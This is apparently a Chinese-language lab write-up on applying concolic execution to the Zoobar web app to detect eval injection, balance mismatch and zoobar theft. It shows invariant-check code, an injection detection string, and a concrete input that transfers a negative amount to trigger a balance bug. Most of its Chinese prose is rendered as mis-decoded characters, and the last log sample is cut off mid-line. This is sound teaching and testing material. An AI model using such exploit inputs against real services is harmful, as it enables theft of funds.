<p><img src="https://s2.loli.net/2022/12/21/YslcqeuVP2C6Ni7.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ç°åœ¨æˆ‘ä»¬æ¥çœ‹  <code>symex/symeval.py</code>  çš„å†…éƒ¨é€»è¾‘ï¼Œå…¶é€»è¾‘æ¯”è¾ƒç®€å•ï¼Œä¸»è¦å°±æ˜¯ç»™å†…ç½®çš„ <code>eval()</code> å¥—äº†ä¸€å±‚ wrapperï¼Œæ£€æŸ¥å‚æ•°æ˜¯å¦å¸¦æœ‰  <code>;badstuff();</code> å­—ç¬¦ä¸²ï¼Œè‹¥æ˜¯åˆ™ç›´æ¥æŠ›å¼‚å¸¸ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">real_eval = builtins.<span class="hljs-built_in">eval</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">myeval</span>(<span class="hljs-params">expr, <span class="hljs-built_in">globals</span> = <span class="hljs-literal">None</span>, <span class="hljs-built_in">locals</span> = <span class="hljs-literal">None</span></span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;;badstuff();&#x27;</span> <span class="hljs-keyword">in</span> expr:<br>    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;eval injection&quot;</span>)<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">locals</span> <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">globals</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-built_in">locals</span> = <span class="hljs-built_in">globals</span><br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">locals</span> <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">globals</span> <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    frame = inspect.currentframe()<br>    <span class="hljs-keyword">try</span>:<br>      <span class="hljs-built_in">locals</span> = frame.f_back.f_locals<br>      <span class="hljs-built_in">globals</span> = frame.f_back.f_globals<br>    <span class="hljs-keyword">finally</span>:<br>      <span class="hljs-keyword">del</span> frame<br><br>  <span class="hljs-comment">## Try to evaluate the expression as an integer</span><br>  v = str_to_small_int(expr)<br>  <span class="hljs-keyword">if</span> v <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">return</span> v<br><br>  <span class="hljs-keyword">return</span> real_eval(expr, <span class="hljs-built_in">globals</span>, <span class="hljs-built_in">locals</span>)<br>builtins.<span class="hljs-built_in">eval</span> = myeval<br></code></pre></td></tr></table></figure>

<p>è€Œåœ¨ <code>check-symex-zoobar.py</code> å½“ä¸­ï¼Œåº”ç”¨äº†æ··åˆæ‰§è¡Œæ¡†æ¶çš„ä¸º <code>test_stuff()</code> å‡½æ•°ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">fuzzy.concolic_execs(test_stuff, maxiter=<span class="hljs-number">500</span>, verbose=<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œæˆ‘ä»¬æš‚ä¸”å…ˆä¸å…³æ³¨ Zoobar çš„å®ç°ä¸ºä½•ï¼Œæˆ‘ä»¬ä¸»è¦å…³æ³¨å¦‚ä½•ä½¿ç”¨æˆ‘ä»¬çš„æ··åˆæ‰§è¡Œç³»ç»Ÿæ¥å¯»æ‰¾å…¶ä¸­çš„æ¼æ´ï¼Œåœ¨ <code>test_stuff()</code> ä¸­å®é™…ä¸Šæ˜¯é€šè¿‡å°†éƒ¨åˆ†å‚æ•°è®¾ç½®ä¸ºæ··åˆå€¼æ¥è¿›è¡Œæ··åˆæ‰§è¡Œï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_stuff</span>():<br>  <span class="hljs-comment"># Zoobaråˆå§‹åŒ–å·¥ä½œ</span><br>  pdb = zoobar.zoodb.person_setup()<br>  pdb.query(zoobar.zoodb.Person).delete()<br>  <span class="hljs-comment">##...</span><br><br>  <span class="hljs-comment">## è®¾ç½®ç¯å¢ƒå˜é‡</span><br>  environ = &#123;&#125;<br>  <span class="hljs-comment">##...</span><br>  environ[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>] = fuzzy.mk_str(<span class="hljs-string">&#x27;referrer&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>  environ[<span class="hljs-string">&#x27;HTTP_COOKIE&#x27;</span>] = fuzzy.mk_str(<span class="hljs-string">&#x27;cookie&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br><br>  <span class="hljs-comment">##...</span><br></code></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦å®ç°ä¸¤ç§é¢å¤–çš„ä¸å˜é‡æ£€æŸ¥ä»¥æ£€æŸ¥ Zoobar æ˜¯å¦å­˜åœ¨å…¶ä»–æ¼æ´ï¼š</p>
<ul>
<li>è‹¥æ²¡æœ‰æ–°ç”¨æˆ·è¢«æ³¨å†Œï¼Œåˆ™æ‰€æœ‰ç”¨æˆ·çš„ Zoobar balances ä¹‹å’Œåº”å½“åœ¨æ¯æ¬¡è¯·æ±‚é—´ä¿æŒä¸€è‡´</li>
<li>è‹¥ç”¨æˆ· <code>u</code> æ²¡æœ‰å‘ Zoobar è¿›è¡Œè¯·æ±‚ï¼Œ<code>u</code> çš„ Zoobar balance ä¸åº”å½“ç¼©å°</li>
</ul>
<p>äºæ˜¯æ¥åˆ° Exercise 9ï¼Œå‘  <code>check-symex-zoobar.py</code> ä¸­æ·»åŠ ç›¸åº”çš„ä¸å˜é‡æ£€æŸ¥ï¼š</p>
<blockquote>
<p><strong>Exercise 9.</strong> Add invariant checks to <code>check-symex-zoobar.py</code> to implement the above two rules (total balance preservation and no zoobar theft). Look for the comment <code>Exercise 9: your code here</code> to see where you should write this code. When you detect a zoobar balance mismatch, call the <code>report_balance_mismatch()</code> function. When you detect zoobar theft, call <code>report_zoobar_theft()</code>.</p>
<p>Recall that our check for exercises 3-6, where you implemented the core of the concolic execution system, was not complete. If you are having trouble with this exercise, it may be that you did not implement exercises 3-6 correctly, so you may need to go back and fix it.</p>
<p>To check whether your solution works correctly, you need to re-run <strong>.&#x2F;check-symex-zoobar.py</strong> and see whether the output contains the messages <code>WARNING: Balance mismatch detected</code> and <code>WARNING: Zoobar theft detected</code>. Alternatively, you can run <strong>make check</strong>, which will do this for you (run <code>check-symex-zoobar.py</code> and look for these magic strings).</p>
</blockquote>
<p>åœ¨ Zoobar ä¸­å®é™…ä¸Šæ˜¯é€šè¿‡ <code>zoobar.app()</code> æ¥å®Œæˆ HTTP è¯·æ±‚çš„è§£æå®ç°ï¼Œå› æ­¤åœ¨  <code>test_stuff()</code>  ä¸­é€‰æ‹©ç›´æ¥æ„é€ è¯·æ±‚ï¼ˆ<code>environ</code> å­—å…¸ï¼‰ä¼ é€’ç»™è¯¥å‡½æ•°æ¥æ¨¡æ‹Ÿå‘ Zoobar å‘é€ HTTP è¯·æ±‚çš„è¿‡ç¨‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">environ = &#123;&#125;<br><span class="hljs-comment">##...</span><br>environ[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] = <span class="hljs-string">&#x27;GET&#x27;</span><br>environ[<span class="hljs-string">&#x27;PATH_INFO&#x27;</span>] = <span class="hljs-string">&#x27;trans&#x27;</span> + fuzzy.mk_str(<span class="hljs-string">&#x27;path&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br><br><span class="hljs-keyword">if</span> environ[<span class="hljs-string">&#x27;PATH_INFO&#x27;</span>].startswith(<span class="hljs-string">&#x27;//&#x27;</span>):<br>  <span class="hljs-comment">## Don&#x27;t bother trying to construct paths with lots of slashes;</span><br>  <span class="hljs-comment">## otherwise, the lstrip() code generates lots of paths..</span><br>  <span class="hljs-keyword">return</span><br><br>resp = zoobar.app(environ, startresp)<br><span class="hljs-keyword">if</span> verbose:<br>  <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> resp:<br>    <span class="hljs-built_in">print</span>(x)<br><span class="hljs-comment">##...</span><br></code></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯¹ä»£ç çš„æ£€æŸ¥åˆ™æ˜¯åœ¨è¯·æ±‚å®Œæˆåè¿›è¡Œçš„ï¼Œé¦–å…ˆæ˜¯å¯¹ balance çš„æ£€æŸ¥ï¼Œè¿™é‡Œä¸äº†è§£ Zoobar çš„ç›¸å…³ç»“æ„ï¼ˆæˆ–è€…æ²¡æ¥å¾—åŠ<del>&#x2F;æ‡’å¾—</del>çœ‹ï¼‰ä¹Ÿä¸è¦ç´§ï¼Œåœ¨ <code>test_stuff()</code> çš„å¼€å¤´æœ‰è¿™æ ·çš„è®¡ç®— balances æ€»å’Œçš„é€»è¾‘ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_stuff</span>():<br>  pdb = zoobar.zoodb.person_setup()<br>  pdb.query(zoobar.zoodb.Person).delete()<br>  adduser(pdb, <span class="hljs-string">&#x27;alice&#x27;</span>, <span class="hljs-string">&#x27;atok&#x27;</span>)<br>  adduser(pdb, <span class="hljs-string">&#x27;bob&#x27;</span>, <span class="hljs-string">&#x27;btok&#x27;</span>)<br>  <span class="hljs-comment"># è®¡ç®— balance æ€»å’Œ</span><br>  balance1 = <span class="hljs-built_in">sum</span>([p.zoobars <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> pdb.query(zoobar.zoodb.Person).<span class="hljs-built_in">all</span>()])<br></code></pre></td></tr></table></figure>

<p>å¯¹äºå•ä¸ªç”¨æˆ·è€Œè¨€æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>person.zoobars</code> è·å–å…¶ balanceï¼Œè€Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>pdb.query(zoobar.zoodb.Person).all()</code> è·å–ç”¨æˆ·å¯¹è±¡åˆ—è¡¨ ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦åœ¨è¯·æ±‚ç»“æŸåä½¿ç”¨åŒæ ·çš„é€»è¾‘è®¡ç®—å½“å‰çš„ balanceï¼Œå¹¶ä¸åŸ balance å¯¹æ¯”å³å¯ï¼Œè‹¥ä¸ä¸€è‡´åˆ™æŒ‰æ‰‹å†Œè¯´æ˜è°ƒç”¨ <code>report_balance_mismatch()</code> å³å¯ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Exercise 9: your code here.</span><br><br><span class="hljs-comment">## Detect balance mismatch.</span><br><span class="hljs-comment">## When detected, call report_balance_mismatch()</span><br>balance2 = <span class="hljs-built_in">sum</span>([p.zoobars <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> pdb.query(zoobar.zoodb.Person).<span class="hljs-built_in">all</span>()])<br><span class="hljs-keyword">if</span> balance1 != balance2:<br>  report_balance_mismatch()<br></code></pre></td></tr></table></figure>

<p>ç„¶åæ˜¯ç¬¬äºŒä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°æ²¡æœ‰è¿›è¡Œæ“ä½œä½†æ˜¯ balance ç¼©å°äº†çš„ç”¨æˆ·ï¼ˆå³å‘ç”Ÿè½¬å‡ºï¼‰ï¼Œç”±äºåœ¨æµ‹è¯•å‡½æ•°ä¸­ä»…è¿›è¡Œäº†ä¸€æ¬¡æ“ä½œï¼Œæ•…æœªè¿›è¡Œæ“ä½œçš„ç”¨æˆ·çš„ balance <strong>ä¸åº”å½“å°äºåˆå§‹å€¼</strong>ï¼ˆä½†æ˜¯å¯ä»¥å¤§äºï¼Œå› ä¸ºå¯ä»¥æœ‰åˆ«çš„è´¦æˆ·å‘å…¶è¿›è¡Œè½¬å…¥ï¼‰ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦çŸ¥é“ä¸€ä¸ªç”¨æˆ·çš„åˆå§‹ä¿¡æ¯</p>
<p>åœ¨ <code>test_stuff()</code> å¼€å¤´ä¾¿å¯¹åº”åˆ›å»ºäº†ä¸¤ä¸ªæ•°æ®åº“ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä»å…¶å®šä¹‰å…¥æ‰‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_stuff</span>():<br>  pdb = zoobar.zoodb.person_setup()<br>  pdb.query(zoobar.zoodb.Person).delete()<br>  adduser(pdb, <span class="hljs-string">&#x27;alice&#x27;</span>, <span class="hljs-string">&#x27;atok&#x27;</span>)<br>  adduser(pdb, <span class="hljs-string">&#x27;bob&#x27;</span>, <span class="hljs-string">&#x27;btok&#x27;</span>)<br>  balance1 = <span class="hljs-built_in">sum</span>([p.zoobars <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> pdb.query(zoobar.zoodb.Person).<span class="hljs-built_in">all</span>()])<br>  pdb.commit()<br><br>  tdb = zoobar.zoodb.transfer_setup()<br>  tdb.query(zoobar.zoodb.Transfer).delete()<br>  tdb.commit()<br>  <span class="hljs-comment">##...</span><br></code></pre></td></tr></table></figure>

<p>åœ¨ <code>zoobar/zoodb.py</code> ä¸­å®šä¹‰äº† Person æ•°æ®åº“ï¼Œå…¶ä¸­ balanceï¼ˆä¹Ÿå°±æ˜¯ zoobars å­—æ®µï¼‰çš„åˆå§‹å€¼ä¸º 10ï¼ŒåŒæ—¶ä¸»é”®ä¸º <code>username</code> ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>(<span class="hljs-title class_ inherited__">PersonBase</span>):<br>    __tablename__ = <span class="hljs-string">&quot;person&quot;</span><br>    username = Column(String(<span class="hljs-number">128</span>), primary_key=<span class="hljs-literal">True</span>)<br>    password = Column(String(<span class="hljs-number">128</span>))<br>    token = Column(String(<span class="hljs-number">128</span>))<br>    zoobars = Column(Integer, nullable=<span class="hljs-literal">False</span>, default=<span class="hljs-number">10</span>)<br>    profile = Column(String(<span class="hljs-number">5000</span>), nullable=<span class="hljs-literal">False</span>, default=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>åœ¨è¯¥æ–‡ä»¶ä¸­è¿˜å®šä¹‰äº† Transfer æ•°æ®åº“ï¼Œåº”å½“ç”¨ä»¥è¡¨ç¤ºå•æ¬¡äº¤æ˜“çš„åŒæ–¹åŠæ•°å€¼ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Transfer</span>(<span class="hljs-title class_ inherited__">TransferBase</span>):<br>    __tablename__ = <span class="hljs-string">&quot;transfer&quot;</span><br>    <span class="hljs-built_in">id</span> = Column(Integer, primary_key=<span class="hljs-literal">True</span>)<br>    sender = Column(String(<span class="hljs-number">128</span>))<br>    recipient = Column(String(<span class="hljs-number">128</span>))<br>    amount = Column(Integer)<br>    time = Column(String)<br></code></pre></td></tr></table></figure>

<p>é‚£ä¹ˆæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥éå† Person æ•°æ®åº“ä»¥è·å¾—æ‰€æœ‰ç”¨æˆ·çš„ç”¨æˆ·åé›†åˆï¼Œæ¥ä¸‹æ¥éå† Transfer æ•°æ®åº“æ¥å°†ç”¨æˆ·åé›†åˆä¸­çš„é sender ç»™å‰”é™¤ï¼ˆå› ä¸ºæˆ‘ä»¬ä¸»è¦å…³æ³¨ recipient å‘ç”Ÿäº† balance ç¼©å°çš„æƒ…å†µï¼‰ï¼Œæœ€åæ£€æŸ¥å‰©ä½™ç”¨æˆ·æ˜¯å¦å­˜åœ¨ balance å°äºåˆå§‹å€¼çš„æƒ…å†µï¼Œè‹¥æ˜¯åˆ™è¯´æ˜å­˜åœ¨æ¼æ´ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Detect zoobar theft.</span><br><span class="hljs-comment">## When detected, call report_zoobar_theft()</span><br>udict = &#123;&#125;<br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> pdb.query(zoobar.zoodb.Person).<span class="hljs-built_in">all</span>():<br>  udict[p.username] = p<br><span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> tdb.query(zoobar.zoodb.Transfer).<span class="hljs-built_in">all</span>():<br>  udict.pop(t.sender)<br><span class="hljs-keyword">for</span> username <span class="hljs-keyword">in</span> udict.keys():<br>  <span class="hljs-keyword">if</span> udict[username].zoobars &lt; <span class="hljs-number">10</span>:<br>    report_zoobar_theft()<br></code></pre></td></tr></table></figure>

<p>æˆåŠŸé€šè¿‡ Exercise 9ï¼š</p>
<p><img src="https://s2.loli.net/2022/12/24/FnSvPHRsQbc6LZT.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æœ€åæ˜¯ Exercise 10ï¼Œä¿®å¤ balance mismatch å’Œ zoobar theft è¿™ä¸¤ä¸ªæ¼æ´ï¼ˆLab å·²ç»æ›¿æˆ‘ä»¬ä¿®å¥½äº† eval injection çš„æ¼æ´ï¼‰ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œè¯„æµ‹ç³»ç»Ÿè¦æ±‚å°†å­˜åœ¨é—®é¢˜çš„æºç æ–‡ä»¶æ‹·è´åˆ° <code>zoobar-fixed</code> ä¸‹å†è¿›è¡Œä¿®å¤ï¼Œï¼š</p>
<blockquote>
<p><strong>Exercise 10.</strong> Fix the two bugs you found in Exercise 9, by copying whatever <code>.py</code> files you need to modify from the <code>zoobar</code> directory to <code>zoobar-fixed</code> and changing them there.</p>
<p>Recall that our check for exercises 3-6, where you implemented the core of the concolic execution system, was not complete. If you are having trouble with this exercise, it may be that you did not implement exercises 3-6 correctly, so you may need to go back and fix it.</p>
<p>To check whether your solution works correctly, you need to run <strong>.&#x2F;check-symex-zoobar-fixed.sh</strong> and see whether the output still contains the messages <code>Exception: eval injection</code>, <code>WARNING: Balance mismatch detected</code> and <code>WARNING: Zoobar theft detected</code>. Alternatively, you can run <strong>make check</strong>, which will do this for you.</p>
</blockquote>
<p>é‚£ä¹ˆæˆ‘ä»¬é¦–å…ˆè¦æ‰¾åˆ°æ¼æ´å‡ºç°çš„ä½ç½®ï¼Œç¬”è€…æœ€åˆçš„æ€è·¯æ˜¯åœ¨ä¸¤ä¸ªæ‰¾åˆ°æ¼æ´çš„ report å‡½æ•°è¿›è¡Œçº¦æŸæ±‚è§£å°±å¯ä»¥è·å¾—é€ æˆé—®é¢˜çš„è¾“å…¥ï¼Œä½†æ˜¯<strong>è¿™ä¸ªåšæ³•å¹¶ä¸å¯è¡Œï¼Œå› ä¸ºæœ¬ Lab æä¾›çš„æ··åˆæ‰§è¡Œæ¡†æ¶æ˜¯é«˜åº¦å°è£…å¥½çš„</strong>ï¼Œåœ¨ <code>concolic_execs()</code> çš„æ‰§è¡Œè¿‡ç¨‹ä¸­æˆ‘ä»¬æ˜¯æ²¡åŠæ³•ä¸­é€”åœä¸‹æ¥è¿›è¡Œçº¦æŸæ±‚è§£çš„</p>
<blockquote>
<p>ç¬”è€…æ€è€ƒäº†åŠå¤©æ€ä¹ˆæ”¹æ‰èƒ½åœ¨ <code>test_stuff()</code> çš„ä¸¤ä¸ª report() å‡½æ•°è¿›è¡Œçº¦æŸæ±‚è§£æ¥å¾—åˆ°è§¦å‘æ¼æ´çš„è¾“å…¥ï¼Œåé¢å‘ç°åŸºæœ¬æ²¡å•¥å¯è¡Œæ€§ï¼Œå®åœ¨è¦å¼„çš„è¯éœ€è¦å¯¹æ•´ä¸ªæ¡†æ¶è¿›è¡Œå¤§æ”¹ï¼Œæ•…å°±æ­¤ä½œç½¢æ”¹æ¢æ€è·¯â€¦</p>
</blockquote>
<p>æˆ‘ä»¬é‡æ–°æ€è€ƒä¸€ä¸ªé—®é¢˜ï¼š  <em>Lab 3 ä¸ºä»€ä¹ˆæä¾›çš„æ˜¯æ··åˆæ‰§è¡Œæ¡†æ¶è€Œéçº¯ç¬¦å·æ‰§è¡Œæˆ–æ˜¯çº¯å…·ä½“æ‰§è¡Œå‘¢ï¼Ÿ</em>  </p>
<p>æ­£å¦‚å‰æ–‡æ‰€è¨€ï¼Œconcolic execution çš„è¯ç”Ÿä¾¿æ˜¯ä¸ºäº†è§£å†³ symbolic execution ä¸ concrete execution æ‰€åˆ†åˆ«å­˜åœ¨çš„é—®é¢˜ï¼Œèåˆä¸¤è€…çš„ç‰¹æ€§æ¥è¾¾åˆ°ä¸€ä¸ªæ›´å¥½çš„æ•ˆæœ</p>
<p>ç°åœ¨è®©æˆ‘ä»¬é‡æ–°å®¡è§† <code>concolic_execs()</code> çš„æ‰§è¡Œæµç¨‹ï¼š</p>
<ul>
<li>ç”±ä¸€ä¸ªå¤–å±‚å¤§å¾ªç¯ä¸æ–­è¿­ä»£<ul>
<li>ä»è¾“å…¥é˜Ÿåˆ—ä¸­å–å‡ºå…·ä½“å€¼å­—å…¸</li>
<li>è°ƒç”¨ <code>concolic_exec_input()</code> æ‰§è¡Œç›®æ ‡å‡½æ•°ï¼Œè·å–åˆ°è¿”å›å€¼ã€åˆ†æ”¯æ¡ä»¶åˆ—è¡¨ã€åˆ†æ”¯è°ƒç”¨æ–¹åˆ—è¡¨</li>
<li>å°†å¾—åˆ°çš„æ–°çš„è¿”å›å€¼æ·»åŠ è‡³ <code>outs</code> é›†åˆ</li>
<li>å†…å±‚å°å¾ªç¯éå†åˆ†æ”¯æ¡ä»¶åˆ—è¡¨<ul>
<li>è°ƒç”¨ <code>concolic_force_branch()</code> è·å–å°†å½“å‰åˆ†æ”¯æ¡ä»¶é€†è½¬åçš„çº¦æŸæ¡ä»¶</li>
<li>è‹¥è¯¥çº¦æŸä¸åœ¨ <code>checked</code> ï¼ˆå·²éªŒè¯çº¦æŸé›†åˆï¼‰ä¸­ï¼Œæ·»åŠ ï¼Œå¹¶è°ƒç”¨ <code>concolic_find_input()</code> è¿›è¡Œçº¦æŸæ±‚è§£</li>
<li>çº¦æŸå¯è§£ï¼Œå°†ç»“æœæ·»åŠ åˆ°ä¸‹ä¸€æ¬¡ä½œä¸ºè¾“å…¥çš„å…·ä½“å€¼å­—å…¸ä¸­</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>æˆ‘ä»¬ä¸éš¾å¾—çŸ¥çš„æ˜¯ï¼Œå½“ <code>test_stuff()</code> æŠ¥å‘Šæ¼æ´æ—¶ï¼Œ<strong>è¯´æ˜æˆ‘ä»¬çš„ concolic execution system ç»™å‡ºäº†ä¸€ä¸ªèƒ½å¤Ÿè§¦å‘æ¼æ´çš„ concrete input</strong></p>
<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹è¯­å¥æ¥å°†è¾“å‡ºé‡å®šå‘è‡³å½“å‰ç›®å½•ä¸‹çš„ <code>typescript</code> æ–‡ä»¶ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">script -c ./check-symex-zoobar.py</span><br></code></pre></td></tr></table></figure>

<p>å‰é¢æˆ‘ä»¬ç”¨åˆ°çš„ä¸¤ä¸ª report() å‡½æ•°å®é™…ä¸Šå°±åªæ˜¯ <code>print()</code> è€Œå·²ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨è¾“å‡ºç»“æœä¸­æœç´¢å¯¹åº”çš„å­—ç¬¦ä¸²å³å¯ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">report_balance_mismatch</span>():<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;WARNING: Balance mismatch detected&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">report_zoobar_theft</span>():<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;WARNING: Zoobar theft detected&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>ä»¥ä¸‹æ˜¯ä¸¤ä¸ªä¾‹å­ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">Trying concrete value: &#123;<span class="hljs-string">&#x27;form_recipient_present&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;form_zoobars_present&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;form_zoobars_val&#x27;</span>: <span class="hljs-string">&#x27;-10&#x27;</span>, <span class="hljs-string">&#x27;rsplit_split_cookie_=_r_#_r&#x27;</span>: <span class="hljs-string">&#x27;atok&#x27;</span>, <span class="hljs-string">&#x27;rsplit_split_cookie_=_r_#_l&#x27;</span>: <span class="hljs-string">&#x27;alice&#x27;</span>, <span class="hljs-string">&#x27;split_cookie_=_r&#x27;</span>: <span class="hljs-string">&#x27;alice#atok&#x27;</span>, <span class="hljs-string">&#x27;split_cookie_=_l&#x27;</span>: <span class="hljs-string">&#x27;PyZoobarLogin&#x27;</span>, <span class="hljs-string">&#x27;cookie&#x27;</span>: <span class="hljs-string">&#x27;PyZoobarLogin=alice#atok&#x27;</span>, <span class="hljs-string">&#x27;path&#x27;</span>: <span class="hljs-string">&#x27;fer&#x27;</span>, <span class="hljs-string">&#x27;form_recipient_val&#x27;</span>: <span class="hljs-string">&#x27;alice&#x27;</span>, <span class="hljs-string">&#x27;referrer&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>&#125;<br>Response: <span class="hljs-number">200</span> OK<br>  Content-<span class="hljs-type">Type</span>: text/html; charset=utf-<span class="hljs-number">8</span><br>  Content-Length: <span class="hljs-number">1689</span><br>  X-XSS-Protection: <span class="hljs-number">0</span><br><span class="hljs-string">b&#x27;&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n    &lt;head&gt;\n        &lt;meta charset=&quot;utf-8&quot;&gt;\n        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css...</span><br><span class="hljs-string"># responseï¼Œæ¯”è¾ƒé•¿ä¸”æ— æ„ä¹‰ï¼Œè¿™é‡Œæš‚ä¸”çœç•¥</span><br><span class="hljs-string">WARNING: Balance mismatch detected</span><br><span class="hljs-string">Trying concrete value: 